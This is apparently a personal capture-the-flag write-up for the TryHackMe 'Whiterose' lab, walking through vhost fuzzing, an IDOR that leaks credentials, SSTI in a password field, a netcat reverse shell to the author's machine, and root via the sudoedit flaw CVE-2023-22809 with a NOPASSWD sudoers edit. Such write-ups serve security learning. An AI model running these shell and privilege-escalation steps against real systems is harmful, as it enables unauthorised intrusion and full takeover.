I had been putting this box off because I hadn't finished the 4th season of Mr. Robot. I finally finished it and decided it was time to do this one. 


# Enumeration

Initial nmap scan showed just two ports open: 22/tcp (SSH) and 80/tcp (HTTP):

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCddbej9ZSf75uuDvLDeym5AYM+loP/3W862HTWjmksh0UuiuIz8UNTrf3ZpgtBej4y3E3EKvOmYFvJHZpFRV/hQBq1oZB3+XXVzb5RovazcnMgvFxI4y5nCQM8qTW09YvBOpzTyYmsKjVRJOfLR+F87g90vNdZ/u8uVl7IH0B6NmhGlCjPMVLRmhz7PuZih38t0WRWPruEY5qGliW0M3ngZXL6MmL1Jo146HtM8GASdt6yV9U3GLa3/OMFVjYgysqUQPrMwvUrQ8tIDnRAH1rsKBxDFotvcfW6mJ1OvojQf8PEw7iI/PNJZWGzkg+bm4/k+6PRjO2v/0V98DlU+gnn
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNMBr/zXjVQItMqdVH12/sZ3rIt2XFsPWRCy4bXCE7InUVg8Q9SVFkOW2LAi1UStP4A4W8yA8hW+1wJaEFP9ffs=
|   256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIdJAkvDVqEAbac77yxYfkM0AU8puWxCyqCBJ9Pd9zCi
80/tcp open  http    syn-ack ttl 60 nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The website said it was undergoing maintenance: 

![Pasted image 20251102094252.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102094252.png?1762094572599)

I began a GoBuster scan that didn't return anything useful so I decided to enumerate Virtual Hosts. 



```bash
ffuf -u http://cyprusbank.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.cyprusbank.thm" -fw 1
```

Found two: 

- www
- admin

www was also under maintenance, but admin returned a login panel

![Pasted image 20251102094408.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102094408.png?1762094648566)

At first I began trying some SQL injection but then I remembered that we were actually given Olivia Cortez's credentials in the room. 

I signed in as her and began poking around the site. 

Found a chat feature: 

![Pasted image 20251102094811.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102094811.png?1762094891580)

I noticed the ?c=5 url parameter and started testing for IDOR

Confirmed IDOR by changing c to 1: 

![Pasted image 20251102094837.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102094837.png?1762094917802)

I started trying various numbers and eventually found credentials in c=0

![Pasted image 20251102094911.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102094911.png?1762094951398)


I logged out as Olivia and logged in as the Gayle Bev user:

Gayle had a little more permissions on the site including the ability to create users and edit passwords. 

When playing with that functionality, I discovered that the site would reflect the newly created password, indicating SSTI was likely: 

![Pasted image 20251102103405.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102103405.png?1762097645029)

I tried various SSTI payloads for a little while until finding one that worked. I was able to curl my Kali VM as a test. 

![Pasted image 20251102103332.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102103332.png?1762097612938)

![Pasted image 20251102103527.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102103527.png?1762097727534)


# Foothold

I was able to turn this SSTI into a shell on the box via a revshells payload: 

```bash
busybox nc 10.13.47.152 4444 -e bash
```

I had heard of this new (to me, at least) tool called Penelope (https://github.com/brightio/penelope) which is a shell catcher with some pretty cool features including an auto-upgrade shell. I decided to give it a shot in this room and it worked pretty well.

I sent a shell via the SSTI and Penlope caught it and upgraded the shell for me: 

![Pasted image 20251102104057.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102104057.png?1762098057314)


# User

user.txt was located in the home folder of the Web user

![Pasted image 20251102104312.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102104312.png?1762098192357)

# Root

As part of my normal Linux enumeration when I land on a box, I ran sudo -l to see what my user could do. Somehow I forgot to grab a picture of that part so the following picture is from someone else's writeup of this box

![[Pasted image 20251102113311.png]]
(https://rradhasan.medium.com/whiterose-tryhackme-by-rradhasan-c3a6f50e8f02)

I did a little bit of research and found a CVE associated with this sudoedit configuration:

https://nvd.nist.gov/vuln/detail/cve-2023-22809

Normally with sudoedit, you can change the editor it uses (I think the default is nano) by exporting the EDITOR environment variable. With this CVE, however, sudoedit mishandles additional arguments. 

This means that I was able to run 

```
export EDITOR="vim -- /etc/sudoers"
```

and then run 

```bash
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

which gave me permissions to modify the /etc/sudoers file 

I modified it to give my user (web) sudo permissions to everything without it prompting for a password via:  

```bash
web ALL=(root) NOPASSWD: ALL
```

and then it just a matter of changing my user to root and obtaining the flag: 

![Pasted image 20251102104903.png](app://e41383c29bad8e6a51da6c0a2e6df8a99512/Users/jared/Documents/hax/Pasted%20image%2020251102104903.png?1762098543966)


# Remediation

- Work in Progress

# Summary

Found admin VHOST

Signed in with Olivia's credentials (given in the prompt)

IDOR to view a message from Gayle to Dev Team containing her password

Signed in as Gayle

Found SSTI in the customer password reset function 

Used SSTI to get a shell as the Web user

user.txt in /home/web

sudo -l showed web user had permission to sudoedit to edit the nginx config

Used sudoedit bypass (CVE-2023-22809) to give ourselves all:all nopasswd in sudoers file 

su to root 

root flag in /root